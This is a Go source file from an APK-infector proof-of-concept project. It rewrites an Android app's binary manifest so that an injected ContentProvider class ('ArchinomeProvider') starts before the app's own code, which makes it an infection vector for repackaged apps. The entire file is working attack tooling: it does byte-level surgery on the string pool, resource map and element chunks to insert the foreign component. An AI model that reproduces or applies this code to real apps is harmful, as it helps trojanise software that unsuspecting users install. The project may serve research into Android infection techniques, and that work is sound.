package manifest

// Provider injection vector.
//
// Injects a <provider android:name="aaaaaaaaaaaa.ArchinomeProvider"
// android:authorities="<pkg>.archinome.provider"/> element as the first child
// of <application> directly into the binary (AXML) manifest. A provider's
// onCreate() runs BEFORE Application.onCreate() during process start, so this
// vector works even for apps that declare no custom Application class — the
// main limitation of the default vector (android:name hijack).
//
// The patch is pure binary surgery:
//   1. append 3 strings ("provider", class name, authorities) to the string pool
//   2. ensure the "authorities" attribute resource id (0x01010018) is in the
//      resource map (the "name" id 0x01010003 is already present in every app)
//   3. insert <provider>...</provider> element chunks after the <application>
//      start tag
//   4. fix the AXML total size
//
// No absolute offsets are stored anywhere in AXML (string references are
// indices, chunk sizes are self-describing), so the only thing that must be
// recomputed is the file-level size field and the string pool's internal
// stringsStart/stringCount.

import (
	"encoding/binary"
	"encoding/xml"
	"log"
	"os"
	"sort"
	"unicode/utf16"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

const (
	androidNamespaceURI = "http://schemas.android.com/apk/res/android"
	providerTagStr      = "provider"
	providerClassName   = "aaaaaaaaaaaa.ArchinomeProvider"
	providerAuthSuffix  = ".archinome.provider"

	// framework attribute resource ids (frameworks/base/core/res/res/values/attrs_manifest.xml)
	resIDName        = 0x01010003
	resIDAuthorities = 0x01010018

	chunkStringPool = 0x0001
	chunkResMap     = 0x0180
	chunkTagStart   = 0x0102
	chunkTagEnd     = 0x0103

	axmlSizeOff = 0x4
)

// ------------------------------------------------------------- binary helpers

func leU16(b []byte, off int) uint16 { return binary.LittleEndian.Uint16(b[off:]) }
func leU32(b []byte, off int) uint32 { return binary.LittleEndian.Uint32(b[off:]) }

func u32bytes(v uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	return b
}

func indexOfU32(a []uint32, v uint32) int {
	for i, x := range a {
		if x == v {
			return i
		}
	}
	return -1
}

// findChunk linearly walks the file and returns the offset of the first chunk
// of the given type. Chunks are self-describing and contiguous (nested XML body
// chunks are still laid out back-to-back), so a simple size-stepping walk works.
func findChunk(data []byte, typ uint16) int {
	for off := 8; off+8 <= len(data); {
		t := leU16(data, off)
		size := int(leU32(data, off+4))
		if t == typ {
			return off
		}
		if size < 8 || off+size > len(data) {
			break
		}
		off += size
	}
	return -1
}

// ------------------------------------------------------------- string pool

type stringPool struct {
	off          int
	size         int
	stringCount  int
	styleCount   int
	flags        uint32
	stringsStart int
	stylesStart  int
	offsets      []uint32 // relative to stringsStart
}

func parseStringPool(data []byte) *stringPool {
	off := findChunk(data, chunkStringPool)
	if off < 0 {
		log.Panic("string pool chunk not found")
	}
	p := &stringPool{off: off}
	p.size = int(leU32(data, off+4))
	p.stringCount = int(leU32(data, off+8))
	p.styleCount = int(leU32(data, off+12))
	p.flags = leU32(data, off+16)
	p.stringsStart = int(leU32(data, off+20))
	p.stylesStart = int(leU32(data, off+24))
	p.offsets = make([]uint32, p.stringCount)
	for i := 0; i < p.stringCount; i++ {
		p.offsets[i] = leU32(data, off+28+i*4)
	}
	return p
}

// readVarLen reads a 1-or-2-byte length prefix at pos (0x80 flag marks the
// two-byte form) and returns (length, newPos).
func readVarLen(data []byte, pos int) (int, int) {
	if data[pos]&0x80 != 0 {
		return int(data[pos]&0x7f)<<8 | int(data[pos+1]), pos + 2
	}
	return int(data[pos]), pos + 1
}

func (p *stringPool) decode(data []byte, idx int) string {
	if idx < 0 || idx >= len(p.offsets) {
		return ""
	}
	abs := p.off + p.stringsStart + int(p.offsets[idx])
	if p.flags&0x100 != 0 {
		// UTF-8 pool: [1-2 byte utf16 len][1-2 byte utf8 len][data]
		_, pos := readVarLen(data, abs)
		utf8Len, pos := readVarLen(data, pos)
		return string(data[pos : pos+utf8Len])
	}
	// UTF-16 pool: [u16 len][len * u16][u16 null]
	length := int(leU16(data, abs))
	abs += 2
	if length&0x8000 != 0 {
		length = int(length&0x7fff)<<16 | int(leU16(data, abs))
		abs += 2
	}
	runes := make([]uint16, length)
	for i := 0; i < length; i++ {
		runes[i] = leU16(data, abs+i*2)
	}
	return string(utf16.Decode(runes))
}

func (p *stringPool) indexOf(data []byte, s string) int {
	for i := 0; i < p.stringCount; i++ {
		if p.decode(data, i) == s {
			return i
		}
	}
	return -1
}

// encodeUTF16String encodes a string for a UTF-16 string pool:
// [u16 len][len * utf16 code units][u16 null].
func encodeUTF16String(s string) []byte {
	runes := utf16.Encode([]rune(s))
	buf := make([]byte, 2+len(runes)*2+2)
	binary.LittleEndian.PutUint16(buf[0:], uint16(len(runes)))
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[2+i*2:], r)
	}
	return buf
}

// encodeUTF8String encodes a string for a UTF-8 string pool (flags&0x100):
// [1-2 byte utf16 len][1-2 byte utf8 len][utf8 data][u8 null].
// Both length prefixes use the 1-or-2-byte form (0x80 flag), matching the
// framework ResStringPool decoder.
func encodeUTF8String(s string) []byte {
	runes := utf16.Encode([]rune(s))
	u16len := len(runes)
	u8 := []byte(s)
	u8len := len(u8)

	head := make([]byte, 0, 4)
	appendVarLen := func(v int) {
		if v < 0x80 {
			head = append(head, byte(v))
		} else {
			head = append(head, byte(0x80|(v>>8)), byte(v&0xff))
		}
	}
	appendVarLen(u16len)
	appendVarLen(u8len)

	buf := make([]byte, 0, len(head)+u8len+1)
	buf = append(buf, head...)
	buf = append(buf, u8...)
	buf = append(buf, 0x00)
	return buf
}

// encodeString encodes a string for the pool's actual encoding (UTF-16 or
// UTF-8), selected by the string pool flags.
func encodeString(flags uint32, s string) []byte {
	if flags&0x100 != 0 {
		return encodeUTF8String(s)
	}
	return encodeUTF16String(s)
}

// ------------------------------------------------------------- provider chunks

// putAttr writes a ResXMLTree_attribute (20 bytes) at off:
// ns(u32) name(u32) rawValue(u32) typedValue{size=8,res0,dataType,data}
func putAttr(b []byte, off int, ns, name, rawValue uint32, dataType uint8, data uint32) {
	binary.LittleEndian.PutUint32(b[off:], ns)
	binary.LittleEndian.PutUint32(b[off+4:], name)
	binary.LittleEndian.PutUint32(b[off+8:], rawValue)
	binary.LittleEndian.PutUint16(b[off+12:], 8) // Res_value.size
	b[off+14] = 0                                 // res0
	b[off+15] = dataType                          // dataType
	binary.LittleEndian.PutUint32(b[off+16:], data)
}

func buildProviderStartTag(androidNs, nameResIdx, authResIdx, tagStrIdx, classStrIdx, authStrIdx uint32) []byte {
	const size = uint32(36 + 2*20) // 16 node + 20 attrExt + 2*20 attrs
	b := make([]byte, size)
	binary.LittleEndian.PutUint16(b[0:], chunkTagStart)
	binary.LittleEndian.PutUint16(b[2:], 0x10)
	binary.LittleEndian.PutUint32(b[4:], size)
	binary.LittleEndian.PutUint32(b[8:], 0)          // lineNumber
	binary.LittleEndian.PutUint32(b[12:], 0xFFFFFFFF) // comment
	// ResXMLTree_attrExt
	binary.LittleEndian.PutUint32(b[16:], 0xFFFFFFFF) // ns (element has none)
	binary.LittleEndian.PutUint32(b[20:], tagStrIdx)  // name = "provider"
	binary.LittleEndian.PutUint16(b[24:], 20)         // attributeStart
	binary.LittleEndian.PutUint16(b[26:], 20)         // attributeSize
	binary.LittleEndian.PutUint16(b[28:], 2)          // attributeCount
	binary.LittleEndian.PutUint16(b[30:], 0)          // idIndex
	binary.LittleEndian.PutUint16(b[32:], 0)          // classIndex
	binary.LittleEndian.PutUint16(b[34:], 0)          // styleIndex
	// android:name = provider class
	putAttr(b, 36, androidNs, nameResIdx, classStrIdx, 0x03, classStrIdx)
	// android:authorities = authorities
	putAttr(b, 56, androidNs, authResIdx, authStrIdx, 0x03, authStrIdx)
	return b
}

func buildProviderEndTag(tagStrIdx uint32) []byte {
	b := make([]byte, 24)
	binary.LittleEndian.PutUint16(b[0:], chunkTagEnd)
	binary.LittleEndian.PutUint16(b[2:], 0x10)
	binary.LittleEndian.PutUint32(b[4:], 24)
	binary.LittleEndian.PutUint32(b[8:], 0)          // lineNumber
	binary.LittleEndian.PutUint32(b[12:], 0xFFFFFFFF) // comment
	binary.LittleEndian.PutUint32(b[16:], 0xFFFFFFFF) // ns
	binary.LittleEndian.PutUint32(b[20:], tagStrIdx)  // name = "provider"
	return b
}

// ------------------------------------------------------------- entry point

func getPackageName() string {
	content, err := os.ReadFile(PlainPath)
	if err != nil {
		log.Panic("Failed to read plaintext manifest", err)
	}
	type Result struct {
		XMLName xml.Name `xml:"manifest"`
		Package string   `xml:"package,attr"`
	}
	v := new(Result)
	if err := xml.Unmarshal(content, v); err != nil {
		log.Panic("Failed to unmarshal XML", err)
	}
	return v.Package
}

// PatchProvider injects the provider element into the already-dumped binary
// manifest (utils.ManifestBinaryPath) and rewrites it in place.
func PatchProvider() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	pool := parseStringPool(data)

	androidNs := pool.indexOf(data, androidNamespaceURI)
	if androidNs < 0 {
		log.Panic("android namespace URI not found in string pool")
	}

	pkg := getPackageName()
	if pkg == "" {
		log.Panic("package name not found")
	}
	authorities := pkg + providerAuthSuffix

	// strings appended at indices stringCount..stringCount+2
	newStrings := []string{providerTagStr, providerClassName, authorities}
	tagStrIdx := uint32(pool.stringCount)
	classStrIdx := uint32(pool.stringCount + 1)
	authStrIdx := uint32(pool.stringCount + 2)

	// relative offsets of new strings (appended after existing string data)
	oldDataSize := pool.size - pool.stringsStart
	var newOffsetBytes, newStringBytes []byte
	acc := oldDataSize
	for _, s := range newStrings {
		enc := encodeString(pool.flags, s)
		newOffsetBytes = append(newOffsetBytes, u32bytes(uint32(acc))...)
		newStringBytes = append(newStringBytes, enc...)
		acc += len(enc)
	}

	newStringCount := pool.stringCount + len(newStrings)
	newStringsStart := pool.stringsStart + len(newStrings)*4
	newPoolSize := pool.size + len(newOffsetBytes) + len(newStringBytes)

	// keep the pool 4-byte aligned (chunks are laid out back-to-back)
	if pad := (4 - newPoolSize%4) % 4; pad != 0 {
		newStringBytes = append(newStringBytes, make([]byte, pad)...)
		newPoolSize += pad
	}

	// resource map: 'name' must exist; append 'authorities' if missing
	resMapOff := findChunk(data, chunkResMap)
	if resMapOff < 0 {
		log.Panic("resource map chunk not found")
	}
	resMapSizeOrig := int(leU32(data, resMapOff+4))
	resMapHdr := int(leU16(data, resMapOff+2))
	resMapCount := (resMapSizeOrig - resMapHdr) / 4
	resIds := make([]uint32, resMapCount)
	for i := 0; i < resMapCount; i++ {
		resIds[i] = leU32(data, resMapOff+8+i*4)
	}
	nameResIdx := indexOfU32(resIds, resIDName)
	if nameResIdx < 0 {
		log.Panic("'name' attribute resource id (0x01010003) not found in resource map")
	}
	authResIdx := indexOfU32(resIds, resIDAuthorities)
	var newResIDBytes []byte
	if authResIdx < 0 {
		authResIdx = len(resIds)
		newResIDBytes = u32bytes(resIDAuthorities)
	}
	newResMapSize := resMapSizeOrig + len(newResIDBytes)

	// provider element chunks
	provStart := buildProviderStartTag(uint32(androidNs), uint32(nameResIdx), uint32(authResIdx), tagStrIdx, classStrIdx, authStrIdx)
	provEnd := buildProviderEndTag(tagStrIdx)

	// locate <application> start tag; insert provider right after it
	appStrIdx := pool.indexOf(data, "application")
	if appStrIdx < 0 {
		log.Panic("'application' string not found")
	}
	insertOff := -1
	for off := 8; off+8 <= len(data); {
		t := leU16(data, off)
		size := int(leU32(data, off+4))
		if size < 8 || off+size > len(data) {
			break
		}
		if t == chunkTagStart && int(leU32(data, off+20)) == appStrIdx {
			insertOff = off + size
			break
		}
		off += size
	}
	if insertOff < 0 {
		log.Panic("application start tag not found")
	}

	// apply edits front-to-back
	newTotal := len(data) +
		(newPoolSize - pool.size) +
		(newResMapSize - resMapSizeOrig) +
		len(provStart) + len(provEnd)

	type edit struct {
		off       int
		val       []byte
		overwrite bool
	}
	edits := []edit{
		{axmlSizeOff, u32bytes(uint32(newTotal)), true},
		{pool.off + 4, u32bytes(uint32(newPoolSize)), true},
		{pool.off + 8, u32bytes(uint32(newStringCount)), true},
		{pool.off + 20, u32bytes(uint32(newStringsStart)), true},
		{pool.off + 28 + pool.stringCount*4, newOffsetBytes, false},
		{pool.off + pool.size, newStringBytes, false},
	}
	if len(newResIDBytes) > 0 {
		edits = append(edits,
			edit{resMapOff + 4, u32bytes(uint32(newResMapSize)), true},
			edit{resMapOff + resMapSizeOrig, newResIDBytes, false},
		)
	}
	edits = append(edits, edit{insertOff, append(provStart, provEnd...), false})

	sort.Slice(edits, func(i, j int) bool { return edits[i].off < edits[j].off })

	out := make([]byte, 0, newTotal)
	cursor := 0
	for _, e := range edits {
		out = append(out, data[cursor:e.off]...)
		out = append(out, e.val...)
		if e.overwrite {
			cursor = e.off + len(e.val)
		} else {
			cursor = e.off
		}
	}
	out = append(out, data[cursor:]...)

	utils.WriteChanges(out, utils.ManifestBinaryPath)
	log.Printf("Provider injected: %s (authorities=%s), manifest size 0x%x -> 0x%x",
		providerClassName, authorities, len(data), len(out))
}
